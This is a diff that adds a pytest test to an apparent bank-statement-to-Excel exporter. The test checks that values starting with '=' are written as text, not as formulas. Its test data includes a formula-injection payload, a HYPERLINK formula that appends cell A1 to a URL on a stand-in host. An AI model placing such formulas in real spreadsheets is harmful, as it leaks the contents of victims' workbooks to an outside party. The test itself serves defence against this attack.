@@ -348,3 +348,49 @@ def test_a_control_character_does_not_abort_the_write(tmp_path: Path) -> None:
     workbook = load_workbook(out)
     assert workbook["Metadata"]["J2"].value == "ACME\ufffdGmbH"
     assert workbook["Entries"]["R2"].value == "pay\ufffdment"
+
+
+def test_statement_text_is_never_written_as_a_formula(tmp_path: Path) -> None:
+    """A value that starts with ``=`` is text from the bank, not a formula.
+
+    openpyxl turns any string starting with ``=`` into a formula cell, so a
+    counterparty name or narrative of ``=HYPERLINK(...)`` would be
+    evaluated when the workbook is opened. Every such value is kept as a
+    string cell holding exactly the text the statement carried.
+    """
+    payload = '=HYPERLINK("https://example.invalid/?"&A1,"open")'
+    document = ParsedDocument(
+        message_type="camt.053.001.08",
+        msg_id="=1+1",
+        statements=[
+            Statement(
+                id="STMT-F",
+                account=Account(owner_name="=SUM(1,2)"),
+                balances=[Balance(type_code="=OPBD", amount="1.00")],
+                entries=[
+                    Entry(
+                        reference="NTRY-F",
+                        amount="5.00",
+                        currency="EUR",
+                        reason_code="AC04",
+                        details=[TransactionDetails(counterparty_name=payload)],
+                    )
+                ],
+            )
+        ],
+    )
+    out = tmp_path / "formula.xlsx"
+
+    write_xlsx(document, out)
+
+    workbook = load_workbook(out)
+    cells = {
+        ("Metadata", "B2"): "=1+1",
+        ("Metadata", "J2"): "=SUM(1,2)",
+        ("Balances", "B2"): "=OPBD",
+        ("Entries", "P2"): payload,
+        ("Reversals", "P2"): payload,
+    }
+    for (sheet, ref), text in cells.items():
+        cell = workbook[sheet][ref]
+        assert (cell.value, cell.data_type) == (text, "s"), (sheet, ref)
